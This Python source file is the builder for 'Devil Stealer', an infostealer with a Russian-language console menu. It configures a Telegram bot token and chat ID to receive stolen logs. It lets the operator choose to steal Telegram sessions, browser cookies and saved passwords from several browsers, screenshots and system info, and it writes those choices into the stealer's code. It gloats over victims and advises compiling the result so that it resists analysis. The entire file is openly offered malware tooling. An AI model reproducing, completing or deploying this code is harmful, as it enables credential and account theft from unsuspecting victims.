import os
import time
import json
import datetime

try:
    from colorama import Back, Fore, init
    init()
    os.system("title Devil Stealer Builder 1.0")
except:
    os.system("title Devil Stealer Builder 1.0")
    print("Требуется установить библиотеку colorama\nВы согласны (Y/N): ")
    info = input()
    if info.lower() == "y":
        print("Установка начинается...")
        time.sleep(1)
        try:
            os.system("pip install colorama")
        except:
            print("Установка не удалась установите библиотеку вручную\n pip install colorama")
    else:
        print("Без установки библиотеки код не может работать!")
        exit(0)
    del info


def buildStealer():
    print("-------[Devil Stealer]-------")
    print("| Хорошо, давай начнем сборку")
    print("| Для начала придумай имя стиллеру")
    name = input("* ")
    print("| Отлично! Теперь дай токен для бота в телеграм для отправки логов")
    tokenbot = input("* ")
    print("| Теперь отправь мне свой chat id в телеграм, чтобы логи отправлялись именно тебе")
    chatid = input("* ")
    print("| Если хочешь можешь написать сообщение которое будет приходить тебе в телеграм, когда жертва скачает стиллер\nЧтобы оставить стандартное напиши \"нет\"")
    messagetg = input("* ")
    if messagetg.lower() == "нет": messagetg = "АХХАХХАХ кто-то попался Данные были успешно украденны 😈! Скачайте логи по кнопке ниже"
    stealResources = [
        False,
        False,
        False,
        False,
        False,
        False,
        False,
        False,
        False,
        False,
        False,
        False,
        False,
        False,
        False
    ]
    def dataSteal():
        os.system("cls")
        time.sleep(0.2)
        print(Fore.RED)
        print("| Теперь можешь настроить какие данные будет воровать стиллер")
        print("| Чтобы включить все напиши \"все вкл\"")
        print("| Чтобы выключить все напиши \"все выкл\"")
        print("| Чтобы сохранить и продолжить напиши \"далее\"")
        print(Fore.RESET)
        if stealResources[0] == True:
            print(Fore.GREEN)
            print("| <1> Telegram - ВКЛ")
        else:
            print(Fore.RED)
            print("| <1> Telegram - ВЫКЛ")

        if stealResources[1] == True:
            print(Fore.GREEN)
            print("| <2> Chrome cookie - ВКЛ")
        else:
            print(Fore.RED)
            print("| <2> Chrome cookie - ВЫКЛ")

        if stealResources[2] == True:
            print(Fore.GREEN)
            print("| <3> Firefox cookie - ВКЛ")
        else:
            print(Fore.RED)
            print("| <3> Firefox cookie - ВЫКЛ")

        if stealResources[3] == True:
            print(Fore.GREEN)
            print("| <4> Opera cookie - ВКЛ")
        else:
            print(Fore.RED)
            print("| <4> Opera cookie - ВЫКЛ")

        if stealResources[4] == True:
            print(Fore.GREEN)
            print("| <5> Yandex cookie - ВКЛ")
        else:
            print(Fore.RED)
            print("| <5> Yandex cookie - ВЫКЛ")

        if stealResources[5] == True:
            print(Fore.GREEN)
            print("| <6> Amigo cookie - ВКЛ")
        else:
            print(Fore.RED)
            print("| <6> Amigo cookie - ВЫКЛ")

        if stealResources[6] == True:
            print(Fore.GREEN)
            print("| <7> Edge cookie - ВКЛ")
        else:
            print(Fore.RED)
            print("| <7> Edge cookie - ВЫКЛ")

        if stealResources[7] == True:
            print(Fore.GREEN)
            print("| <8> Chrome passwords - ВКЛ")
        else:
            print(Fore.RED)
            print("| <8> Edge cookie - ВЫКЛ")

        if stealResources[8] == True:
            print(Fore.GREEN)
            print("| <9> Firefox passwords - ВКЛ")
        else:
            print(Fore.RED)
            print("| <9> Firefox passwords - ВЫКЛ")

        if stealResources[9] == True:
            print(Fore.GREEN)
            print("| <10> Opera passwords - ВКЛ")
        else:
            print(Fore.RED)
            print("| <10> Opera passwords - ВЫКЛ")

        if stealResources[10] == True:
            print(Fore.GREEN)
            print("| <11> Yandex passwords - ВКЛ")
        else:
            print(Fore.RED)
            print("| <11> Yandex passwords - ВЫКЛ")

        if stealResources[11] == True:
            print(Fore.GREEN)
            print("| <12> Amigo passwords - ВКЛ")
        else:
            print(Fore.RED)
            print("| <12> Amigo passwords - ВЫКЛ")

        if stealResources[12] == True:
            print(Fore.GREEN)
            print("| <13> Edge passwords - ВКЛ")
        else:
            print(Fore.RED)
            print("| <13> Edge passwords - ВЫКЛ")

        if stealResources[13] == True:
            print(Fore.GREEN)
            print("| <14> Screenshot - ВКЛ")
        else:
            print(Fore.RED)
            print("| <14> Screenshot - ВЫКЛ")

        if stealResources[14] == True:
            print(Fore.GREEN)
            print("| <15> Pc info - ВКЛ")
        else:
            print(Fore.RED)
            print("| <15> Pc info - ВЫКЛ")
        print(Fore.RED)
        select = input("* ")
        if select.lower() == "все вкл":
            for i in range(len(stealResources)):
                stealResources[i] = True
            print(Fore.RESET)
            dataSteal()
        elif select.lower() == "все выкл":
            for i in range(len(stealResources)):
                stealResources[i] = False
            print(Fore.RESET)
            dataSteal()
        elif select.lower() == "далее":
            os.system("cls")
        else:
            try:
                select1 = int(select)
                select1 -= 1
                if stealResources[select1] == False:
                    stealResources[select1] = True
                    time.sleep(0.2)
                    dataSteal()
                else:
                    stealResources[select1] = False
                    time.sleep(0.2)
                    dataSteal()
            except Exception as e:
                os.system("cls")
                print(e)
                time.sleep(5)
                dataSteal()

    dataSteal()
    time.sleep(1)
    os.system("cls")
    print(Fore.RED)
    print("-------[Devil Stealer]-------")
    print("| И последнее. Укажите название для папки временных файлов стиллера")
    filename = input("* ")

    print("| Ожидайте код стиллера скоро будет написан")
    time.sleep(2)

    with open(r"devilStealer\bot.py", "r+", encoding='utf-8') as file:
        code = file.readlines()
        code[11] = f"bot = telebot.TeleBot(\"{tokenbot}\")" + "\n"
        code[8] = f"ADMIN_ID = \"{chatid}\" # Your telegram id" + "\n"
        code[28] = f"    bot.send_message(ADMIN_ID, \"DevilStealer>>> {messagetg}\", reply_markup=lnkkb)" + "\n"

    with open(r"devilStealer\bot.py", "w", encoding='utf-8') as file:
        file.writelines(code)
        del code

    with open(r"devilStealer\stealer.py", "r", encoding='utf-8') as file:
        code = file.readlines()
        code[14] = "FILE_PATH = fr\"C:\\Users\{os.getlogin()}\AppData\Roaming" + f"\{filename}\"" + "\n"
        code[15] = "FILE_COOKIE = fr\"C:\\Users\{os.getlogin()}\AppData\Roaming" + f"\{filename}\cookie\"" + "\n"
        code[16] = "FILE_PASSWORDS = fr\"C:\\Users\{os.getlogin()}\AppData\Roaming" + f"\{filename}\passwords\"" + "\n"
        code[17] = "FILE_TG = fr\"C:\\Users\{os.getlogin()}\AppData\Roaming" + f"\{filename}\\tdata\"" "\n"
        code[18] = "SCREENSHOT_PATH = fr\"C:\\Users\{os.getlogin()}\AppData\Roaming" + f"\{filename}\screenshot.jpg\"" + "\n"

        if stealResources[0] == True: code[499] = "    telegram_steal()" + "\n"
        if stealResources[0] == False: code[499] = "\n"
        if stealResources[1] == True: code[500] = "    chrome_cookie()" + "\n"
        if stealResources[2] == True: code[501] = "    firefox_cookie()" + "\n"
        if stealResources[3] == True: code[502] = "    opera_cookie()" + "\n"
        if stealResources[4] == True: code[503] = "    yandex_cookie()" + "\n"
        if stealResources[5] == True: code[504] = "    amigo_cookie()" + "\n"
        if stealResources[6] == True: code[505] = "    edge_cookie()" + "\n"
        if stealResources[7] == True: code[506] = "    chrome_passwords()" + "\n"
        if stealResources[8] == True: code[507] = "    firefox_passwords()" + "\n"
        if stealResources[9] == True: code[508] = "    opera_passwords()" + "\n"
        if stealResources[10] == True: code[509] = "    yandex_passwords()" + "\n"
        if stealResources[11] == True: code[510] = "    amigo_passwords()" + "\n"
        if stealResources[12] == True: code[511] = "    edge_passwords()" + "\n"
        if stealResources[13] == True: code[512] = "    take_screenshot()" + "\n"
        if stealResources[14] == True: code[513] =  "    pcinfo()" + "\n"

    with open(r"devilStealer\stealer.py", "w", encoding='utf-8') as file:
        file.writelines(code)
        del code


    time.sleep(1)
    os.system("cls")
    stealerinfo = {
        "name": name,
        "token": tokenbot,
        "Create data": str(datetime.date.today()),
        "Chat id": chatid
    }
    with open("cache.json", "a") as file:
       json.dump(json.dumps(stealerinfo), file)

    del stealerinfo

    print(Fore.RED)
    print("-------[Devil Stealer]-------")
    print("| Стиллер успешно написан и готов к работе!")
    print("| Код стиллера находится в папке: devilStealer")
    print("| Фаил для запуска: bot.py")
    print("| Если вам нужен фаил .exe воспользуйтесь nuitka или pyinstaller (лично я рекомендую первое т.к код будет выполнятся быстрее и его нельзя будет вскрыть)")
    print("| Спасибо за использование билдера Devil Stealer! Удачи")
    os.system("pause")

def mainMenu():
    os.system("cls")
    print(Fore.RED)
    print("""
    ██████╗░███████╗██╗░░░██╗██╗██╗░░░░░  ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░
    ██╔══██╗██╔════╝██║░░░██║██║██║░░░░░  ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗
    ██║░░██║█████╗░░╚██╗░██╔╝██║██║░░░░░  ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝
    ██║░░██║██╔══╝░░░╚████╔╝░██║██║░░░░░  ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗
    ██████╔╝███████╗░░╚██╔╝░░██║███████╗  ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║
    ╚═════╝░╚══════╝░░░╚═╝░░░╚═╝╚══════╝  ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝
    """)
    print("-------[Devil Stealer]-------")
    print("| Добро пожаловать в билдер =)")
    print("| Тут вы можете собрать собственный стиллер")
    print("| Что вас интересует?\n| 1 - Собрать стиллер\n| 2 - Мои стиллеры (BETA)\n| 3 - Автор")
    info = input("* ")

    if info == "3":
        os.system("cls")
        print("-------[Devil Stealer]-------")
        print("| Автор стиллера: 0xSn1kky\n| Github: https://github.com/0xSn1kky/devilStealer\n| Youtube: https://www.youtube.com/channel/UCo3yqAlAobt4KB6o9UwQxeg")
        time.sleep(15)
        os.system("cls")
        mainMenu()
    elif info == "1":
        os.system("cls")
        buildStealer()
    elif info == "2":
        os.system("cls")
        print("-------[Devil Stealer]-------")
        print("| (BETA) Все ваши стиллеры:")
        with open("cache.json", "r") as file:
            print(Fore.CYAN)
            for line in file:
                try:
                    stealers = json.loads(line)
                    print(stealers)
                except Exception as e:
                    print(e)
        print(Fore.RED)
        os.system("pause")

mainMenu()
